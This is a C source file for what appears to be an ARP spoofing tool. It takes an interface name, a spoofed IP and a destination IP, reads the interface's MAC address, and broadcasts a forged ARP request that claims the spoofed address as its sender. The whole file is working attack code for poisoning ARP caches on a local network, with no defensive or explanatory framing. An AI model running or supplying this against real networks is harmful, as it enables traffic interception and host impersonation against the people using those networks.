#include "helpers.h"
#include "parsers.h"
#include "sock_ops.h"

#include <sys/ioctl.h>
#include <net/if.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

struct ifreq ifr;
uint8_t hwaddr[ETH_ALEN];
int if_index;

int main(int argc, char *argv[]) {

    if(argc != 4) {
        printf("Enter network device name and spoofed and destination IP\n");
        exit(1);
    }

    int sock = make_socket(argv[1]);

    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);

    if(ioctl(sock, SIOCGIFINDEX, &ifr)){
        perror("SIOCGIFINDEX");
        exit(1);
    }

    if_index = ifr.ifr_ifindex;

    if(ioctl(sock, SIOCGIFHWADDR, &ifr)){
        perror("SIOCGIFHWADDR");
        exit(1);
    }

    struct arp_pac packet = {
        .htype = htons(ARPHRD_ETHER),
        .ptype = htons(ETHERTYPE_IP),
        .hlen = ETH_ALEN,
        .plen = 4,
        .oper = htons(ARPOP_REQUEST)
    };

    uint32_t spa, tpa;

    inet_pton(AF_INET, argv[2], &spa);
    inet_pton(AF_INET, argv[3], &tpa);

    memcpy(hwaddr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    memcpy(packet.sha, hwaddr, ETH_ALEN);
    memcpy(packet.spa, &spa, sizeof(uint8_t) * 4);

    memset(packet.tha, 0, ETH_ALEN);
    memcpy(packet.tpa, &tpa, sizeof(uint8_t) * 4);

    broadcast_frame(sock, &packet);

    return 0;
}
